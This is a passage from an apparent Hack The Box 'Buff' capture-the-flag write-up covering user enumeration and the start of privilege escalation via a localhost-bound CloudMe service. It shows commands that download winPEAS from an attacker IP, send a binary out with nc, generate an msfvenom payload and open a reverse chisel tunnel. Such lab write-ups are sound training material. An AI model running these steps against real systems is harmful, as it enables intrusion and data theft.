</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; whoami
whoami
buff<span style="color:#f1fa8c">\s</span>haun
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          <span style="color:#8be9fd;font-style:italic">State</span>
<span style="color:#ff79c6">=============================</span> <span style="color:#ff79c6">====================================</span> <span style="color:#ff79c6">========</span>
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working <span style="color:#8be9fd;font-style:italic">set</span>       Disabled
SeTimeZonePrivilege           Change the <span style="color:#8be9fd;font-style:italic">time</span> zone                 Disabled
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>esktop&gt;cd /Users/
C:<span style="color:#f1fa8c">\U</span>sers&gt;cd shaun/Desktop
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>esktop&gt;type user.txt
<span style="color:#8be9fd;font-style:italic">type</span> user.txt
<span style="color:#ff79c6">[</span>Redacted<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">privilege escalation</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;powershell -command <span style="color:#f1fa8c">&#34;wget &#39;http://10.10.14.6:9001/winPEAS.bat&#39; -out winPEAS.bat&#34;</span>
powershell -command <span style="color:#f1fa8c">&#34;wget &#39;http://10.10.14.6:9001/winPEAS.bat&#39; -out winPEAS.bat&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>We find a CloudMe process &hellip; it happens that CloudMe_1112.exe is in shaun/Downloads directory</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#8be9fd;font-style:italic">cd</span> /users/shaun/Downloads
<span style="color:#8be9fd;font-style:italic">cd</span> /users/shaun/Downloads

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads

14/07/2020  13:27    &lt;DIR&gt;          .
14/07/2020  13:27    &lt;DIR&gt;          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
               <span style="color:#bd93f9">1</span> File<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>     17,830,824 bytes
               <span style="color:#bd93f9">2</span> Dir<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>   7,086,542,848 bytes free
</code></pre></td></tr></table>
</div>
</div><p>Looking at exploitdb shows it is vulnerable</p>
<p>Download the binary</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload<span style="color:#f1fa8c">\n</span>c.exe -w <span style="color:#bd93f9">3</span> 10.10.14.25 <span style="color:#bd93f9">9003</span> &lt; CloudMe_1112.exe
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ctf@014202efa8c8:~/htb/buff$ nc -lnp <span style="color:#bd93f9">9003</span> &gt; CloudMe_1112.exe
ctf@014202efa8c8:~/htb/buff$ file CloudMe_1112.exe
CloudMe_1112.exe: PE32 executable <span style="color:#ff79c6">(</span>GUI<span style="color:#ff79c6">)</span> Intel 80386, <span style="color:#ff79c6">for</span> MS Windows, Nullsoft Installer self-extracting archive
</code></pre></td></tr></table>
</div>
</div><p>CloudMe is a i386 32 bits binary</p>
<h2 id="searchsploit-1">searchsploit</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  buff searchsploit cloudme
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
CloudMe 1.11.2 - Buffer Overflow <span style="color:#ff79c6">(</span>PoC<span style="color:#ff79c6">)</span>                | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow <span style="color:#ff79c6">(</span>SEH_DEP_ASLR<span style="color:#ff79c6">)</span>       | windows/local/48499.txt
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
------------------------------------------------------ ---------------------------------
Shellcodes: No Results
_  buff cp /opt/exploitdb/exploits/windows/remote/48389.py .
_  buff chmod +x 48389.py
</code></pre></td></tr></table>
</div>
</div><p>Looking at the python script, the payload has been generated with <code>msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python</code>, and we have to modify the target IP to match our machine</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#8be9fd;font-style:italic">$env</span>:PROCESSOR_ARCHITECTURE
x86
PS C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#ff79c6">[</span>System.Environment<span style="color:#ff79c6">]</span>::Is64BitOperatingSystem
True
PS C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; <span style="color:#ff79c6">[</span>Environment<span style="color:#ff79c6">]</span>::OSVersion
<span style="color:#ff79c6">[</span>Environment<span style="color:#ff79c6">]</span>::OSVersion

Platform ServicePack Version      VersionString
-------- ----------- -------      -------------
 Win32NT             10.0.17134.0 Microsoft Windows NT 10.0.17134.0
</code></pre></td></tr></table>
</div>
</div><p>x86 =&gt; Will use i386 architecture</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;powershell
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; netstat -aof | findstr LISTEN
netstat -aof | findstr LISTEN
  <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
  TCP    127.0.0.1:3306         BUFF:0                 LISTENING       <span style="color:#bd93f9">2880</span>
  TCP    127.0.0.1:8888         BUFF:0                 LISTENING       <span style="color:#bd93f9">1348</span>
  <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; Get-Process
Get-Process

Handles  NPM<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>    PM<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>      WS<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>     CPU<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    <span style="color:#bd93f9">430</span>      <span style="color:#bd93f9">24</span>    <span style="color:#bd93f9">18724</span>       <span style="color:#bd93f9">9080</span>              <span style="color:#bd93f9">6644</span>   <span style="color:#bd93f9">1</span> ApplicationFrameHost
    <span style="color:#bd93f9">161</span>      <span style="color:#bd93f9">10</span>     <span style="color:#bd93f9">1924</span>       <span style="color:#bd93f9">1532</span>              <span style="color:#bd93f9">5724</span>   <span style="color:#bd93f9">1</span> browser_broker
    <span style="color:#bd93f9">382</span>      <span style="color:#bd93f9">26</span>    <span style="color:#bd93f9">32088</span>      <span style="color:#bd93f9">38548</span>              <span style="color:#bd93f9">5312</span>   <span style="color:#bd93f9">0</span> CloudMe
    <span style="color:#bd93f9">280</span>      <span style="color:#bd93f9">17</span>     <span style="color:#bd93f9">3096</span>       <span style="color:#bd93f9">4132</span>       1.22   <span style="color:#bd93f9">1268</span>   <span style="color:#bd93f9">0</span> CloudMe_1112
    <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>Something is listening on 127.0.0.1:8888</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; Get-Process -Id <span style="color:#ff79c6">(</span>Get-NetTCPConnection -LocalPort 8888<span style="color:#ff79c6">)</span>.OwningProcess
Get-Process -Id <span style="color:#ff79c6">(</span>Get-NetTCPConnection -LocalPort 8888<span style="color:#ff79c6">)</span>.OwningProcess

Handles  NPM<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>    PM<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>      WS<span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span>     CPU<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    <span style="color:#bd93f9">351</span>      <span style="color:#bd93f9">24</span>    <span style="color:#bd93f9">30452</span>      <span style="color:#bd93f9">37600</span>              <span style="color:#bd93f9">7096</span>   <span style="color:#bd93f9">0</span> CloudMe
</code></pre></td></tr></table>
</div>
</div><p>We found CloudMe but we can&rsquo;t exploit as it is litening on localhost, unless we can port forward</p>
<p>Download and compile Chisel for both my system</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/jpillora/chisel
<span style="color:#8be9fd;font-style:italic">cd</span> chisel
go build
</code></pre></td></tr></table>
</div>
</div><p>List available compiler for target windows operating system (victim)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  chisel git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> go tool dist list | grep windows
windows/386
windows/amd64
windows/arm
</code></pre></td></tr></table>
</div>
</div><p>Compile windows binaries 32 and 64 bits</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">env <span style="color:#8be9fd;font-style:italic">GOOS</span><span style="color:#ff79c6">=</span>windows <span style="color:#8be9fd;font-style:italic">GOARCH</span><span style="color:#ff79c6">=</span>amd64 go build
cp ./chisel.exe ~/htb/buff/http/chisel64.exe

env <span style="color:#8be9fd;font-style:italic">GOOS</span><span style="color:#ff79c6">=</span>windows <span style="color:#8be9fd;font-style:italic">GOARCH</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">386</span> go build
cp ./chisel.exe ~/htb/buff/http/chisel32.exe
</code></pre></td></tr></table>
</div>
</div><p>Upload and run chisel64.exe on victim as a client, ./chisel on attacker host as a server to port forward remote 127.0.0.1:8888 from victim to 127.0.0.1:9999 on attacker host</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;chisel64.exe client 10.10.14.6:9003 R:9999:127.0.0.1:8888
chisel64.exe client 10.10.14.6:9003 R:9999:127.0.0.1:8888
2020/09/26 13:50:14 client: Connecting to ws://10.10.14.6:9003
2020/09/26 13:50:15 client: Retrying in 100ms...
2020/09/26 13:50:15 client: Retrying in 200ms...
2020/09/26 13:50:15 client: Retrying in 400ms...
2020/09/26 13:50:16 client: Retrying in 800ms...
2020/09/26 13:54:58 client: Connecting to ws://10.10.14.6:9003
2020/09/26 13:54:58 client: Fingerprint 7a:24:7b:3c:4e:a5:3a:19:9b:1e:8e:d6:cf:d1:7c:a9
2020/09/26 13:54:59 client: Connected <span style="color:#ff79c6">(</span>Latency 48.1005ms<span style="color:#ff79c6">)</span>

--------------------------------------------------------
